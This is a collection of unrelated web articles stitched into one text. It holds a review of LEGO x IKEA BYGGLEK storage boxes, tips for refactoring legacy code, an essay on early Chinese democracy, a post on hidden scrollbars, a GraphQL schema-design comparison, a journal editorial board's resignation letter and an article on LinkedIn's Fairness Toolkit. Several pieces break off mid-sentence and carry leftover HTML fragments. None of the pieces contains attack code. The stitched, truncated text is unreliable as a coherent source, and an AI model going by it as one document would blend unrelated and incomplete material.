<p>We have also measured the approximate capacity of the boxes for you:</p>
<ul>
<li>Small box: 0,25 L</li>
<li>Medium small box: 0,63 L</li>
<li>Middle box: 2,9 L</li>
<li>Large box: 6,6 L</li>
</ul>
<h3><span id="the-lids">The lids</span></h3>
<p>The lids of the boxes consist of different sized baseplates, either 1 (small boxes) or 2 bricks (medium and large boxes) high, each with rounded edges. In fact, the view to the bottom is especially interesting, because there the lids remind of the old 10 x 20 baseplates (<a href="https://instagram.com/bricktwintowers">700eX</a>) that LEGO produced until 1969.</p>
<p><a href="https://www.stonewars.de/wp-content/uploads/2020/07/lego-ikea-bygglek-deckel.jpg"><img src="https://www.stonewars.de/wp-content/uploads/2020/07/lego-ikea-bygglek-deckel.jpg" data-src="https://www.stonewars.de/wp-content/uploads/2020/07/lego-ikea-bygglek-deckel.jpg" alt="LEGO x IKEA BYGGLEK lid" width="5280" height="2448" data-srcset="https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-bygglek-deckel.jpg 5280w, https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-bygglek-deckel-150x70.jpg 150w, https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-bygglek-deckel-1024x475.jpg 1024w, https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-bygglek-deckel-768x356.jpg 768w, https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-bygglek-deckel-1536x712.jpg 1536w, https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-bygglek-deckel-2048x950.jpg 2048w" data-sizes="(max-width: 5280px) 100vw, 5280px" srcset="https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-bygglek-deckel.jpg 5280w, https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-bygglek-deckel-150x70.jpg 150w, https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-bygglek-deckel-1024x475.jpg 1024w, https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-bygglek-deckel-768x356.jpg 768w, https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-bygglek-deckel-1536x712.jpg 1536w, https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-bygglek-deckel-2048x950.jpg 2048w"></a></p>
<p>However, the clutch power is different: While the old baseplates don’t stick that good (anymore), but at least have a certain cutch power, the BYGGLEK cover is absolutely loose and always has a certain play.</p>
<p>On the upper side, the cross-shaped ribbing on the underside of both the old LEGO plates and the BYGGLEK lids creates quite unattractive “sink marks” due to the accumulation of plastic during the injection moulding process. However, these are only visible when the plates are held against the light and are difficult to photograph. The studs on the top of the lid correspond to the normal LEGO studs with the usual clutch power. Here we couldn’t see any difference to other LEGO studs. They are therefore perfect as a base for various LEGO buildings or – provided you have the necessary patience – can be decorated very well. The <a href="https://www.stonewars.net/commentaries/lego-art-rebrick-possible/">LEGO Art Mosaics</a> send their regards.</p>

<h3><span id="stackable">Stackable?</span></h3>
<p>The BYGGLEK boxes can be stacked without any problems, but they do not have any clutch power on each other and are standing on each other with a certain play. In addition, there is always a small, somewhat unsightly and irritating gap when the boxes are stacked.</p>

<h3><span id="production-ikea-or-lego">Production: IKEA or LEGO?</span></h3>
<p>Let’s briefly come back to the manufacturer of the boxes: Whether they are manufactured by IKEA under license from LEGO, or whether LEGO manufactures the boxes and distributes them through IKEA, is not quite clear. In any case, the boxes are manufactured in the Czech Republic, where LEGO also operates a factory. However, there is no recognizable seal with a code that provides information about the production process, as LEGO always uses on its own products, on the three boxes. Only on the LEGO x IKEA BYGGLEK 40357 set with the 201 LEGO bricks there is a seal on the box (in my case labeled 09O0), which proves that the LEGO is manufactured in Billund.</p>
<p>After the official introduction of the BYGLLEK product line we will try to get more official information for you here.</p>
<h2><span id="how-about-a-refrigerator">How about a refrigerator?</span></h2>
<p>Together with <a href="https://www.instagram.com/jonaskramm/">Jonas Kramm</a> (in a not quite equal division of labour 😉) we have used Jonas’ LEGO collection to turn the smallest of the BYGGLEK boxes into something new. The shape and color of the box were already so clear that it became clear quite fast what it should become: A refrigerator. And this is what came out of it:</p>
<p><a href="https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-kuelschrank-8.jpg"><img src="https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-kuelschrank-8.jpg" data-src="https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-kuelschrank-8.jpg" alt="LEGO IKEA BYGGLEK Kühlschrank" width="2048" height="2048" data-srcset="https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-kuelschrank-8.jpg 2048w, https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-kuelschrank-8-150x150.jpg 150w, https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-kuelschrank-8-1024x1024.jpg 1024w, https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-kuelschrank-8-768x768.jpg 768w, https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-kuelschrank-8-1536x1536.jpg 1536w, https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-kuelschrank-8-65x65.jpg 65w" data-sizes="(max-width: 2048px) 100vw, 2048px" srcset="https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-kuelschrank-8.jpg 2048w, https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-kuelschrank-8-150x150.jpg 150w, https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-kuelschrank-8-1024x1024.jpg 1024w, https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-kuelschrank-8-768x768.jpg 768w, https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-kuelschrank-8-1536x1536.jpg 1536w, https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-kuelschrank-8-65x65.jpg 65w"></a></p>
<p>Maybe this is a little inspiration what you can do with the IKEA boxes. But of course the refrigerator gives little indication of how useful the BYGGLEK boxes can be used in everyday life. Think of it as a nice gimmick – building it was fun anyway!</p>
<h2><span id="conclusion-a-little-clueless8230">Conclusion: A little clueless…</span></h2>
<p>The IKEA BYGGLEK boxes leave me a little bit clueless at the moment. They seem exactly like what they are: A balancing act between a box and kind of a “foundation” for building LEGO. Neither of them really fulfils either of these requirements. As a pure box for storing LEGO the boxes are too small, too impractical and actually too expensive. Here the transparent SAMLA boxes from IKEA do a much better job and are cheaper.</p>
<p>In order to be really useful for playing and building, I lack the clamping force of the boxes on each other. For example, a child’s imagination could be used to build multi-storey houses, which without the clamping force always seems a bit unstable. I also find the fact that only the lids and the small “niches” on the outside of the boxes can be built on, a little disappointing. A few knobs inside the boxes would have already increased the playability considerably. Here you have to get active yourself and lay out the boxes with plates.</p>
<p>But I want to be honest: I’m not a child anymore and in some places I certainly lack the imagination that goes along with it. And since I’m not a particularly talented builder either, I may also be missing a little bit of the sense for the creative use of the boxes in the everyday life of adult LEGO fans.</p>
<p><strong>What do you think about the LEGO x IKEA BYGGLEK boxes? Is this a product that interests you? And are you curious about the other products that are supposed to be released? Feel free to exchange your thoughts in the comments!</strong></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>🇫🇷 Si tu souhaites lire cet article en français, je l’ai écris à l’origine <a href="https://www.jesuisundev.com/7-techniques-pour-reprendre-le-controle-de-ton-legacy-code/">en tant qu’article invité sur jesuisundev.com</a>.</em></p><p>Let’s face it: we spend most of our time changing existing code. Usually, we didn’t even write that code in the first place. Often, there’s no test. Sometimes, the authors of the code are long gone! And yet, we have to understand and modify this code – without introducing any bug, thank you.</p><p>You’d love to change any part of the code with confidence… but you never have time! This change has been estimated as a 2-day task and there are many others to ship before the end of the Sprint/demo to the client/delivery/<em>&lt;insert your deadline here<!-- -->&gt;</em>. Nightmare!</p><p>But what if you had a secret weapon? Techniques to approach this Legacy efficiently, reach your goal without getting distracting with all the Technical Debt? You could regain control of this project and make it easier to maintain, each iteration!</p><p>Working on Legacy Code is indeed no fun… but it could be.</p><p>Here are 7 concrete techniques that will help you regain control of your Legacy.</p><h2 id="1-the-brain-dump-🧠"><a href="#1-the-brain-dump-%F0%9F%A7%A0" aria-label="1 the brain dump 🧠 permalink"></a>1. The Brain Dump 🧠</h2><p>Your brain is not optimized to memorize a lot of things. You can only juggle with a limited number of thoughts.</p><p>The problem is: your Legacy is a jungle. It’s full of badly named variables, non-standard structures, useless indirections, bad abstractions… To reach your goal, you need to go through a lot of traps you can’t anticipate. When you move something, you reveal 3 more issues that were hidden behind!</p><p>If you try to juggle with all of these things in your head, you’ll get lost.</p><p>It’s the “I’m almost done on this ticket” effect. You have been repeating that for the past 3 days during stand-up. This usually ends up with Pull Requests that are too long and contain many more changes than expected.</p><p>You need to get these ideas out to not getting lost. The easiest way to do that is <strong>a sheet of paper</strong>.</p><p>Take a sheet and a pencil. Start by dumbing everything you want to do on this code. Write down a TODO list.</p><p>Then, choose a first task and start doing it.</p><p>As you move on this task, you’ll have new ideas. New tasks that you discover. Refactors you want to do. When it happens, don’t do them: <strong>write them down!</strong></p><p><undefined>

    </undefined></p><p>Writing them down on your piece of paper has 2 main benefits:</p><ol><li><strong>You calm your mind.</strong> It knows information is out of your head and you won’t forget it. Thus, you’ll stop rehashing this idea every 5 minutes and you can focus on the ongoing task!</li><li><strong>You’ll avoid the tunnel effect.</strong> You’ll end what you started before you start something else. You’ll cross off the task that is done, commit, and take a break! You’ll have a clearer vision of your progress instead of a vague feeling of “almost done”.</li></ol><p>If you know <a href="https://gettingthingsdone.com/">the GTD method</a>, this will feel familiar.</p><h2 id="2-the-mikado-method-🥢"><a href="#2-the-mikado-method-%F0%9F%A5%A2" aria-label="2 the mikado method 🥢 permalink"></a>2. The Mikado Method 🥢</h2><p>The Mikado Method is a similar concept than the Brain Dump, but with more structure. It’s perfect when you want to reach a particular goal and you don’t know what will get in your way.</p><p>Here again, you just need a sheet and a pencil.</p><p>Start writing down your main goal. Circle it twice. Then, try to achieve it.</p><p>If you realize you need something else to do this task, do these 2 very important things:</p><ol><li>Cancel your pending changes (<code>git reset --hard</code>)</li><li>Write down the subtask you need to do and link it to the main task.</li></ol><p>Then, start over from the subtask. Iterate if you realize you miss something again.</p><p><undefined>

    </undefined></p><p>At some point, the subtask will be so small that you’ll be able to do it without trouble. Great! Commit that, cross off that task, and celebrate internally!</p><p>Then, take another subtask and continue. As you achieve subtasks, you make the main one easier. At some point, doing it will be really easy!</p><p>Just like the Brain Dump, you’ll feel less stressed and you’ll have a better view of your progress. You’ll be able to push intermediate Pull Requests that will progressively make the main goal easier to achieve.</p><p>If you want to learn more, I’ve dedicated <a href="https://understandlegacycode.com/blog/a-process-to-do-safe-changes-in-a-complex-codebase">a full post on this</a> and <a href="https://www.manning.com/books/the-mikado-method">there’s a book on that</a>.</p><h2 id="3-over-committing-"><a href="#3-over-committing-" aria-label="3 over committing  permalink"></a>3. Over-committing ➿</h2><p>When you work on Legacy Code, it’s very easy to get stuck in a position where nothing works anymore and you don’t really know why.</p><p>In this context, I recommend taking a safer approach.</p><p>I mean, if only you had a way to have checkpoints for every single step you take in the right direction! With this, you won’t have to start over again if you do one or two wrong moves. You could just go back to the last checkpoint!</p><p>Well, this is <em>exactly</em> where your version control system excels. Create checkpoints.</p><p>My advice: when you work on Legacy Code, commit very very very often. You should commit more often than you imagine. Here are 2 options:</p><ol><li><strong>Commit every 5 minutes.</strong> That’s easy to do, you only need a timer. Each time it rings, commit and run the timer again.</li><li><strong>If you practice the Mikado Method, commit every subtask you achieve.</strong> The technique is optimized to make you do small changes, therefore it’s perfect for frequent commits.</li></ol><p><undefined>

                        <p>In this essay, I’ll tell you a bit about early seeds of democracy in China during the period 1900-1949. Contrary to popular belief, this period was surprisingly modern and open. It starts towards the end of the Qing dynasty (大清, 1644-1912), goes through Republic of China (中華民國, 1912-1949*), and ends with Mao's People’s Republic Of China (中華人民共和國, 1949-).</p><p>This period - as well as the half century before - saw an increase in western influence. Militarily, this started with the British defeating China in the Opium War (1842) and the following Treaty of Nanjing, after which many events followed (another Opium War, more treaties, Sino-Japanese war, suppression of Boxer uprising, etc). This meant that there were treaty ports that were under foreign control by the French, British, Japanese, United States, etc. The former great Chinese empire lost a lot of its power. The current PRC government calls this the Century of humiliation (百年耻辱, 1842-1949).</p><p>Whether guns or books came first, this was also accompanied by an increased interest in western ideas. Western books were translated, a lot of them via Japanese. For example, Yan Fu (嚴復, 1854-1921) translated classics by people such as Darwin, Adam Smith, John Stuart Mill, Herbert Spencer, Montesquieu, etc around the turn of the century. <sup><a href="#notes">[1]</a></sup></p><p>Before these translations, certain Western concepts such as freedom or liberty didn’t exist. <em>Ziyou</em> (自由) came from a translation of John Stuart Mill’s <strong>On Liberty</strong> (possibly as a loan word via Japanese). The story is more complex than that, where concepts don’t always naturally map, and during e.g. Song dynasty the phrase appears to have been used, but without the political connotations.</p><p>A lot of this interest in Western ideas came from local individuals and merchants who perhaps were educated in the west and lived in Shanghai and similar treaty ports. Many of them were standing with one foot in Chinese culture and one in Western, and found ways to reconcile these, sometimes compatible sometimes contradictory, systems of thinking. They didn’t see Chinese culture as being incompatible with democracy. Instead, they faulted politics, specifically one party rule and civil strife. <sup><a href="#notes">[2]</a></sup>.</p><p>Due to wars and foreign intervention, the central government was fairly weak. However, in many places the local and provincial government was more powerful. In Chinese governance, like in many other countries, there is a clear distinction between the local, provincial and national levels. <sup><a href="#notes">[3]</a></sup> This era, with a weak national government, is often called the Warlord Era (軍閥時代).</p><figure><img src="https://upload.wikimedia.org/wikipedia/commons/3/32/China_imperialism_cartoon.jpg" alt="https://upload.wikimedia.org/wikipedia/commons/3/32/China_imperialism_cartoon.jpg"><figcaption>Political cartoon showing foreign powers carving up China. [16]</figcaption></figure><p>The term ’warlord’ brings images of military autocrats, chaos and mayhem. While there is some truth to that, the term itself was often used as a form of propaganda. Warlordism or militarism internally in China was linked to Western imperialism. <sup><a href="#notes">[4]</a></sup></p><p>Looking at casualties between major wars during 1917-1930, there were 400,000 deaths. This might seem like a lot, but China has a big population, and this was spread out over a long period of time. Rawski estimates that deaths from all causes at the time was 13.5 million per year, which means only one out of 500 deaths occurred on the battle field. <sup><a href="#notes">[5]</a></sup> This should also be compared with the 20m+ deaths during rebellions in 19th century, or millions killed during Mao era.</p><p>Hu Shih (胡適, 1891-1962), a famous philosopher and diplomat who studied in the US with John Dewey (school of pragmatism), noticed that a lot of the violence during the Warlord Era came from attempts to unify China from above.</p><blockquote>In a country as large as China, no matter how strong an order imposed from the centre, it would eventually produce division; well-run, self-administered localities, he believed, could knit the country together. <sup><a href="#notes">[6]</a></sup></blockquote><p>In other words, a voice for pragmatic localism and self-governance.</p><p>While explaining the origins of the Nationalist Party (KMT, 國民黨) and Communist Party (CCP, 中國共產黨) is not part of this essay, their names are pretty self-explanatory. They were both against Western imperialism, in their own way, and were trying to fill the gap after the Qing empire. There is an idea of 'revolution as history' where we focus largely on the history of revolutions and their proponents. Often these people are less important than they might appear. It is easy to look at this period and focus only on the Nationalist Party and Communist Party, but there were many other people and ideas that don’t fit neatly into this two party divide. They had their own interests, and had a big impact in terms of driving ideas of freedom and democracy. <sup><a href="#notes">[7]</a></sup></p><figure><img src="https://laosima.com/content/images/2020/08/image-2.png" alt=""><figcaption>Shanghai Street in early 1900s. [17]</figcaption></figure><p>In the early years during the twentieth century, several places in China had various forms of local elections.</p><p>Shanghai saw early democratic institutions in the form of a city council, which was outside of the Shanghai’s International Settlement. <sup><a href="#notes">[8]</a></sup> In 1907, the Shanghai General Works Board extended voting rights to everyone who was a resident for more than five years and paid a minimum amount of local taxes. This followed similar events in Tianjin City council elections the year prior. <sup><a href="#notes">[9]</a></sup></p><p>In 1909 China held elections with an elite of two million people. This was later expanded in 1912 to 40 million people. Fincher writes:</p><blockquote>these freely contested, and at the time, well reported elections produced representative assemblies which ended the world’s oldest monarchy, proclaimed Asia’s first republic, and practiced liberal democracy. <sup><a href="#notes">[10]</a></sup></blockquote><p>He later continues:</p><blockquote>as measured by electorate size, the Chinese polity had advanced in 1909 from the standard set in the Japanese election of 1890 of slightly more than 1 percent (of a population of 40 million) to slightly less than 2 percent (of 400 million). In 1912 the Chinese polity achieved a standard (10 per cent of 400 million) which Japan did not reach until 1928, in the first election to follow implementation in Japan of universal male suffrage. <sup><a href="#notes">[11]</a></sup></blockquote><p>Sun Yat-Sen (孫中山, 1866-1925) was the first leader of KMT, and the first president of the Republic Of China. He was well-read on the European Enlightenment and Chinese culture and attempted to bridge them in his own way. The plan was to have the "Nationalist revolution" in three phases, with the first being a violent unification of China, and the last being democratic constitutional rule. <sup><a href="#notes">[12]</a></sup> Unsurprisingly, they didn’t get to the latter phase.</p><p>One of the most important features of democracy, to be able to vote people out of office and keep them accountable with a rule of law, was missing from the very start:</p><blockquote>He left no notion as to how Chinese politics should be institutionalized, for his thought on public administration did not include ways of preventing those in authority from abusing their powers <sup><a>[13]</a></sup></blockquote><p>As Chiang Kai-shek (蔣中正, 1887-1975) eventually took over, it became more like a personal dictatorship with everything you’d expect from such a regime. <sup><a href="#notes">[14]</a></sup> There was one upside though. Unlike the communists, with the Nationalist government intellectuals could enjoy the freedom of silence. Generally speaking, intellectuals survived the Nationalist rule, unlike during CCP's rule. <sup><a href="#notes">[15]</a></sup></p><p>For whatever reason, liberal opposition and the third force failed. The CCP took over China, and KMT ended up in Taiwan (台灣). In Taiwan, more measures were taken, and it failed there as well. For a while, until it succeeded. But that’s a story for another time.</p><figure><img src="https://laosima.com/content/images/2020/08/shanghai1946.jpg" alt=""><figcaption><em>Exodus from Shanghai in 1949. [18]</em></figcaption></figure><p>Should we look at the current CCP government as a continuation of great empires, as they would like to see themselves, or something else?</p><p>Europe had kings and monarchies for a long time before modern democracy developed during the last few hundred years. As people get exposed to more ideas, we see which forms of governance works better. While progress isn’t linear or even necessarily a well-defined thing, useful systems tends to survive and fragile systems die out.</p><p>This is one of the reasons why you can't talk about e.g. Taiwan in mainland China. Many would argue that the CCP is afraid of its own people, and Taiwan shows what "Chinese democracy" might look like.</p><p>We can look at the period from 1900 to 1949 as an intermission, or at the current regime as an aberration that is going against a global trend that has been unfolding over hundreds of year.

                <p>
                  In 2011, Apple released
                  <a href="https://en.wikipedia.org/wiki/Mac_OS_X_Lion">Mac OS X Lion</a>
                  which introduced an enhanced scrollbar behavior that made
                  scrollbars hidden by default. The scrollbar appears when the
                  user starts scrolling a document and disappears after the
                  scrolling stops.
                </p>
                <p>
                  It appears, however, that this enhancement did not only change
                  the user interface, but has also shaped how developers (don't)
                  think about that specific UI element when creating
                  cross-platform solutions. I call it
                  <strong>scrollbar blindness</strong>.
                </p>
                <p>
                  Lately, for some reason, I've started to notice more of it. I
                  have been to numerous websites that have elements with
                  <code>overflow-y</code> or <code>overflow-x</code> set to
                  <code>scroll</code> while the element is not meant to be
                  scrollable. For no apparent reason, some even set both
                  <code>x</code> and <code>y</code> axes scrollable or create
                  multiple levels of stacked scrollbars.
                </p>
                <h2>Comparison</h2>
                <p>
                  Here's a side-by-side comparison of the same scrollbar-heavy
                  containers rendered by Firefox on Linux (with scrollbars) and
                  MacOS (without).

                <h2>Examples</h2>
                <p>
                  Here are some examples of scrollbar blindness I've stumbled
                  upon:
                </p>
                <ul>
                  <li>

                        underneath document's scrollbar. This produces a very
                        confusing user experience as the view is scrollable, but
                        the (document's) scrollbar is not moving. After
                        scrolling to the bottom of the modal, document's
                        scrollbar takes over and scrolls the main view instead.

                  </li>
                  <li>
                    <a href="https://www.seb.ee/eng/internship">seb.ee</a>: Footer columns have unnecessary vertical scrollbars.
                  </li>
                  <li>
                    <a href="https://embarkstudios.teamtailor.com/">teamtailor.com</a>: Cookie notice has an unnecessary scrollbar.
                  </li>
                  <li>
                    <a href="https://www.recursive.design/">recursive.design</a>: Page and all text editing sections have unnecessary
                    horizontal scrollbars. In mobile view, some containers are
                    given an extra scrollbar.
                  </li>
                </ul>
                <p>
                  As can be seen from the examples, even big organizations like
                  Github and Snapchat that have tens if not a hundred front-end
                  developers and probably have a code review process in place,
                  let the problem slip through. I collected these examples
                  months ago and the scrollbars are still just as I found them.
                </p>
                <h2>Conclusion</h2>
                <p>
                  If you are a front-end developer that uses macOS, I kindly ask
                  you to dedicate a little more attention to how the websites
                  you create behave on platforms other than your own.
                  Alternatively, you can set the scrollbars to be visible at all
                  times by setting
                  <code>System Preferences -&gt; General -&gt; Show scroll bars</code>
                  to <code>Always</code>.
                </p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>GraphQL started back in 2012 at Facebook HQ. Before being publicly released in 2015 it was used internally as a cure to the underperformance observed in mobile apps on slower networks. GraphQL is a query language for APIs, its main advantage is allowing clients to define exactly what type of data is required. The centerpiece of any GraphQL project is its schema.</p>
<p><strong>GraphQL schema</strong> is a set of rules describing the functionality available to the client, including specification of operations (queries and mutations) that can be executed to execute against your data graph. </p>
<p>If you ever decide to build a GraphQL service at some point you would need to chose which approach you want to affiliate with more:</p>
<ul>
<li><strong>Schema-first</strong> - prioritizing process of designing the schema,</li>
<li><strong>Code-first (resolver-first)</strong> - approach prioritizing code over schema, where the GraphQL schema is generated programmatically.</li>
</ul>
<p>In either case, we will end up with a fully functional GraphQL service, but this choice will influence your project in terms of the amount of work you will need to put to achieve certain things like scaling your project etc.</p>

<h2>Schema-first</h2>
<p>Schema-first is an approach that puts schema as your source of truth and forces your code to follow the definitions stored in your schema. In general, prioritizing thinking about the schema. If schema design falls short, you might end up with an API that’s ignoring your business needs and needs of your end-users.</p>
<p><strong>Some of the pros:</strong></p>
<ul>
<li>it should most of the times results in a better-designed API,</li>
<li>it’s more abstract and less dependent by following the dependency inversion principle (DIP),</li>
<li>Schema-first approach reduces development time by allowing frontend and backend teams simultaneously (schema data is easily mockable i.e. with <a href="https://app.graphqleditor.com/explore-projects/twitter">graphql-editor mock backend feature 🚀</a>),</li>
</ul>
<p><strong>Some of the cons/difficulties:</strong></p>
<ul>
<li>the schema definition must be constantly synced with the resolvers, otherwise might cause serious problems,</li>
<li>might lead to code redundancy as SDL definitions are not so easily reusable,</li>
<li>difficulty in combining distributed schemas into a single schema (require using 3rd party tools like <a href="http://graphqleditor.com/">graphql-editor</a> or <a href="https://github.com/ardatan/graphql-tools">graphql-tools</a>)</li>
</ul>
<h2>Code-first</h2>
<p>Code-first (often called resolver-first) is a process where the schema is defined and implemented programmatically. The design process begins with coding the resolvers and the SDL version of the GraphQL schema is a generated artifact (created with a script, not manually). </p>
<p><strong>Some of the pros:</strong></p>
<ul>
<li>can work as a single source of truth as it keeps stored both the schema definitions as well as resolvers,</li>
<li>code-first can  easily overcome difficulties met in schema-first approach, without the usage of a vast amount of tools,</li>
<li>better manageable if you expect your schema to grow in complexity or size,</li>
</ul>
<p><strong>Some of the cons/difficulties:</strong></p>
<ul>
<li>having both the definitions and resolves might be less readable,</li>
<li>your API design is easier influenced by implementation rather than business needs,</li>
<li>backward-incompatible changes can slip in more easily compared to schema’s first approach.</li>
</ul>
<h2>The evolution</h2>
<p>When GraphQL was publicly released in the 2015 ecosystem we know haven’t existed (quite obvious) and the only things that we could lean on were the official GraphQL specification and <code>graphql-js</code> (the reference implementation in JavaScript) until 2016 when <code>graphql-tools</code> repo was founded which firstly promoted schema-first approach by separating two layers of working with schema:</p>
<ul>
<li><strong>the schema definition</strong> - writing GraphQL schema definition using Schema Definition Language (SDL),</li>
<li><strong>the schema implementation</strong> - writing required resolvers. </li>
</ul>
<p>After that, the schema-first become default approach but seeing its limitations people started looking for some workarounds which led to first code-first frameworks being released. The Code-first approach is becoming so popular that almost every GraphQL implementation now has its code-first alternative, or even focusing on only the code-first path.</p>

                  <p>August 25, 2020<br></p>
                  
                  <p>Dear Colleagues,<br></p>
                  
                  <p>We would like to inform you about an upcoming major transition for the Journal of Field Robotics.<br></p>
                  
                  <p>After 15 years of service, John Wiley and Sons, the publisher has decided not to renew the <br></p>
                  <p>contract of the Editor in Chief (Sanjiv Singh) and the Managing Editor (Sanae Minick) and <br></p>
                  <p>hence our term will expire at the end of 2020.<br></p>
                  
                  <p>This comes after two years of discussions between new Wiley representatives and the <br></p>
                  <p>Editorial Board have failed to converge to a common set of principles and procedures by <br></p>
                  <p>which the journal should operate. The Editorial Board has unanimously decided to resign.<br></p>
                  
                  <p>We do want to assure the authors who have papers under review that we see it as our <br></p>
                  <p>responsibility to bring these documents to resolution during our term. We will continue to <br></p>
                  <p>process new submissions until the end of the year. More about the future at the end of this note.<br></p>
                  
                  <p>While the issue at the heart of our disagreement with Wiley is about academic independence, <br></p>
                  <p>it should be noted that there is a structural issue here. Scholarly publishing is broadly in flux <br></p>
                  <p>at the moment in the search for a sustainable model. Currently, academics are not paid to <br></p>
                  <p>create and review articles.&nbsp; In fact, they often have to pay fees to publish, and, readers have <br></p>
                  <p>to pay to access the work through a pay per view system, or, through subscriptions. <br></p>
                  <p><a title="https://www.coalition-s.org" href="https://www.coalition-s.org/">Plan S</a>, an international consortium makes the dilemma clear:<br></p>
                  
                  <p>"Monetising the access to new and existing research results is profoundly at odds <br></p>
                  <p>with the ethos of science (Merton, 1973 )… In the 21st century, science publishers <br></p>
                  <p>should provide a service to help researchers disseminate their results. They may <br></p>
                  <p>be paid fair value for the services they are providing, but no science should be locked <br></p>
                  <p>behind paywalls!"<br></p>
                  
                  <p>While this moment calls for creativity and collaboration with the scholarly community to find <br></p>
                  <p>new models, Wiley is intent on making broad changes to the way that the Journal of Field <br></p>
                  <p>Robotics is operated, guided mostly by an economic calculation to increase revenue and <br></p>
                  <p>decrease costs. To do this, they have unilaterally decided to change the terms of the <br></p>
                  <p>contract that has been constant since the JFR was started in 2005. Wiley has confronted a <br></p>
                  <p>similar case (European Law Journal) with similar effect— <a onclick="window.open(this.href); return false;" title="https://europeanlawblog.eu/2020/02/04/what-a-journal-makes-as-we-say-goodbye-to-the-european-law-journal/" href="https://europeanlawblog.eu/2020/02/04/what-a-journal-makes-as-we-say-goodbye-to-the-european-law-journal/" onkeypress="window.open(this.href); return false;">the entire editorial board has <br></a></p>

                  <p>Wiley insists that the new contract is covered under a confidentiality agreement that not even <br></p>
                  <p>the Editorial Board can examine. What we can say is that the net effect of Wiley’s demands <br></p>
                  <p>would make the Editors contractors to the publisher rather than having them respond to the <br></p>
                  <p>board. We see this as a breach of academic autonomy.<br></p>
                  
                  <p>In resigning, the Editorial Board of the Journal of Field Robotics reaffirms its commitment to <br></p>

        <div>
            
<p>LinkedIn Fairness Toolkit (LiFT) was <a href="https://github.com/linkedin/LiFT">released</a> by the largest professional networking giant to enhance explainable AI initiatives by practitioners and organizations. This comes at the time when we are witnessing heated debate about the fairness of computer vision technology. Today, artificial intelligence is being used in a wide range of solutions right from identity authentication to determining defects in products and finding people with facial recognition. However, the lack of explainability in machine learning models has become a major roadblock that is hampering the proliferation of the latest technologies.</p>



<p>Although a wide range of libraries, services, and methodologies have been released in the last few years such as LIME, IBM Fairness 360 Toolkit, FAT-Forensics, DeepLIFT, Skater, SHAP, Rulex, <a href="https://cloud.google.com/explainable-ai">Google Explainable AI</a>, among others, the solutions have failed to democratize among users as they fail to deliver in large-scale problems or are very specific to cloud or use cases. Consequently, there was a need for a toolkit that can be leveraged across different platforms and problems.</p>

<p>This is where LinkedIn Fairness Toolkit bridges such gaps in the artificial intelligence landscape by enabling practitioners to deliver machine learning models to users without bias.</p>



<h3>LinkedIn Fairness Toolkit (LiFT)</h3>



<p>LinkedIn Fairness Toolkit is a Scala/Spark library that can evaluate biases in the entire lifecycle of model development workflows, even in large-scale machine learning projects. As per the release <a href="https://engineering.linkedin.com/blog/2020/lift-addressing-bias-in-large-scale-ai-applications">note</a> of LinkedIn, the library has broad utility for organizations that wish to conduct regular analyses of the fairness of their own models and data.</p>



<p>Since machine learning models are now actively used in healthcare and criminal justice, it is necessary for an explainable toolkit to find correlation among different categories effectively. Consequently, LinkedIn Fairness Toolkit is a near-perfect fit for such use cases as it can be deployed to measure biases in training data, detect statistically significant differences in models’ performance across different subgroups, and evaluate fairness in ad hoc analysis.&nbsp;</p>

<p>In addition, LinkedIn Fairness Toolkit comes with a unique metric-agnostic <a href="https://arxiv.org/abs/2007.05124">permutation testing</a> framework that identifies statistically significant differences in model performance (as measured according to any given assessment metric) across different subgroups. However, the <a href="https://arxiv.org/abs/2007.05124">Evaluating Fairness Using Permutation Tests</a> methodology will appear at <a href="https://www.kdd.org/kdd2020/">KDD 2020</a>, the authors noted.</p>



<h3>What’s Behind LiFT?</h3>



<figure><img src="https://lh4.googleusercontent.com/KJkaTpDgFNYr1LTch4SVU55G5IDOA8KJsUUR107DSQ09VjLkaeBz_Gofs14li-qlMFqxl7yR3A9YMXP6VjOWi__bELi5ABK-xuL2G2cfb1Lh1kES80MDzvhK2LaJIGDY1tGJools" alt=""><figcaption>LinkedIn Fairness Toolkit</figcaption></figure>



<p>Built to work effortlessly on large scale machine learning workflows, the library can be used at any stage of the models’ development. As a result, you can carry out ad hoc analysis and still interact with the library for explainability. While the library provides flexibility as it can be used in production and even on Jupyter Notebook, for scalability while measuring bias, it leverages Apache Spark to enable you to process a colossal amount of data distributed over numerous nodes.</p>



<figure><img src="https://lh6.googleusercontent.com/SWa0QVPVLPbE-Ik_RcWWwfgcH_GhxYjmpXC2cr2UvOAD1aI43nhCIS7C3j5cw-5vNXFnQxkmJt3iQVtUCDxSFEpZYk-4K-u2e6L4Y2W_0JbaNy8W7OnvPfzPVofcQR5HqL34YtYu" alt=""><figcaption>High-level and low-level APIs</figcaption></figure>



<p>The design of the LinkedIn Fairness Toolkit also offers multiple interfaces based on the use cases with its high-level and low-level APIs for assessing fairness in models. While the high-level APIs can be used to compute metrics available, with parameterization handled by appropriate configuration classes, the low-level APIs enable users to integrate just a few metrics into their applications, or extend the provided classes to computer custom metrics.</p>



